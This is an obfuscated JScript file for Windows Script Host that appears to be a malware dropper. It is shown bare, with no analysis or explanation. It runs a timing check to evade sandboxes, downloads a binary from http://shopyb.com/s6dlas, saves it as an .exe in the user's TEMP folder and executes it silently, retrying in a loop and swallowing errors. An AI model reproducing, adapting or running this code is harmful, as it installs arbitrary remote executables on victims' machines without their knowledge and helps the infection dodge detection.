var _OJ0 = false;
var _Y0 = "CreateObject";
var _I = function _ZB() {return WScript[_Y0]("WScript"+".Shell");}(), _RF = 11;
var _N = "MSXML2.XMLHTTP";
var _W = 2123213;
var _A0 = 0;
function _Y(_N0){_I["Run"](_N0, _A0, _A0);};
function _S(){return _N + "";};
function _KJ(_J, _EY){_A0 = _A0 * 1; return _J - _EY;};
function _A(){return _Y0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _OJ0 = true;
  @end
@*/
if (_OJ0)
{
var _GY = "";
function _KO(){return 22;};
var _K = 0; var _B0 = 0;
function _RU()
{
var _HL = new this["Date"]();
var _OJ = _HL["getUTCMilliseconds"]();
WScript["Sleep"](_KO());
var _HL = new this["Date"]();
var _UM = _HL["getUTCMilliseconds"]();
WScript["Sleep"](_KO());
var _HL = new this["Date"]();
var _WC = _HL["getUTCMilliseconds"]();
var _K = "_V";
_K = _KJ(_UM, _OJ);
var _B0 = "_O";
_B0 = _KJ(_WC, _UM);
_GY = "open";
return _KJ(_K, _B0);
}
var _TJ = false;
var _BP = false;
for (var _G0 = _A0; _G0 < _KO() * 1; _G0++){if (_RU() != _A0){
_TJ = true; 
_B0 = "31" + 11 * _K + _B0; 
_BP = true; 
break;
}}
function _D() {return ((_TJ == true) && (_TJ == _BP)) ? 1 : _A0;};
if (_TJ && _D() && _BP){
function _G() {return _I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9THmzDw0h.ex" + "e";};
 _KD = _S();
 _Q = WScript[_Y0](_KD);
 var _L = 1;
 while (_L){
try {
	if (_L == 1)
	{
		_Q[_GY]("GET", "http://shopyb.com/s6dlas", false);
		_Q["send"]();
		_B = "Sleep";
	}
	WScript[_B](_KO() + 120); 
	if (_Q["readystate"] < 2 * 2) continue;
	_L = _A0;
	function _GX(_JY) {var _V0 = (1, 2, 3, 4, 5, _JY); return _V0;};
	_YI = WScript[_A()]("ADODB.Stream");
	_KD = _YI;
	_KD[_GY]();
	_KD["type"] = _GX(1);
	_KD["write"](_Q["ResponseBody"]);
	_YI["position"] = _GX(_A0);
	_KD["Save" + "ToFile"](_G(), 2);
	_YI["cl"+"ose"]();
	_YX = _G();
	_Y(_YX);
} catch(_TA){};
}
}
}

